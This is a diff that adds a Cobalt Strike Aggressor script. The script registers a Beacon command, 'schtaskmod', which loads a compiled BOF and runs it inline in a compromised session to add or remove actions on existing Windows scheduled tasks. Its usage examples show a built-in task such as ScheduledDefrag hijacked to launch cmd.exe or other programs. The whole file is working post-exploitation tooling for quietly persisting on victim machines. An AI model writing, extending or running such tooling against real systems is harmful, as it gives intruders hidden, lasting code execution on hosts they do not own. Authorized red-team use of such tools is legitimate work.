@@ -1,0 +1,69 @@
+# Registered Alias: schtaskmod <add/remove> <task_path_or_name> <program_path> [arguments]
+alias schtaskmod {
+    local('$bid $action $taskName $programPath $taskArgs $barch $handle $bof_data $packed_args');
+    
+    $bid = $1;
+
+    # Validate mandatory arguments
+    if (size(@_) < 3) {
+        berror($bid, "Usage: schtaskmod add <task_name_or_path> <new_program_path> [optional_arguments]");
+        berror($bid, "Usage: schtaskmod remove <task_name_or_path>");
+        berror($bid, "Example: schtaskmod add \"MyTask\" \"C:\\windows\\system32\\cmd.exe\" \"/c notepad.exe\"");
+        berror($bid, "Example: schtaskmod add \"Microsoft\\Windows\\Defrag\\ScheduledDefrag\" \"C:\\windows\\system32\\calc.exe\"");
+        berror($bid, "Example: schtaskmod remove \"ModifiedTask\"");
+        return;
+    }
+
+    # Extract arguments from CLI
+    $action = $2;
+    $taskName = $3;
+    $programPath = $4;
+    $taskArgs = $5;
+
+    if ($action ne "add" && $action ne "remove") {
+        berror($bid, "Invalid action '$action'. Action must be 'add' or 'remove'.");
+        berror($bid, "Usage: schtaskmod add <task_name_or_path> <new_program_path> [optional_arguments]");
+        berror($bid, "Usage: schtaskmod remove <task_name_or_path>");
+        return;
+    }
+
+    if ($action eq "add" && size(@_) < 4) {
+        berror($bid, "Usage: schtaskmod add <task_name_or_path> <new_program_path> [optional_arguments]");
+        berror($bid, "Example: schtaskmod add \"MyTask\" \"C:\\windows\\system32\\cmd.exe\" \"/c notepad.exe\"");
+        return;
+    }
+
+    # Default optional/unused parameters to empty strings
+    if ($programPath is $null) {
+        $programPath = "";
+    }
+    if ($taskArgs is $null) {
+        $taskArgs = "";
+    }
+
+    # Determine the architecture of the current Beacon session
+    $barch = barch($bid);
+
+    # Load the compiled BOF object file
+    $handle = openf(script_resource("bof-schtaskmod.obj"));
+    $bof_data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($bof_data) < 1) {
+        berror($bid, "Could not find compiled BOF file 'bof-schtaskmod.obj' in script directory.");
+        return;
+    }
+
+    # Pack arguments:
+    # "Z" = Null-terminated wide string (UTF-16)
+    # We pack: action ("Z"), taskName ("Z"), programPath ("Z"), and taskArgs ("Z")
+    $packed_args = bof_pack($bid, "ZZZZ", $action, $taskName, $programPath, $taskArgs);
+
+    # Execute the BOF inline
+    if ($action eq "add") {
+        btask($bid, "SchtaskMod BOF: Modifying task '$taskName' to append new action '$programPath' with args '$taskArgs'...");
+    } else {
+        btask($bid, "SchtaskMod BOF: Modifying task '$taskName' to remove last action...");
+    }
+    beacon_inline_execute($bid, $bof_data, "go", $packed_args);
+}
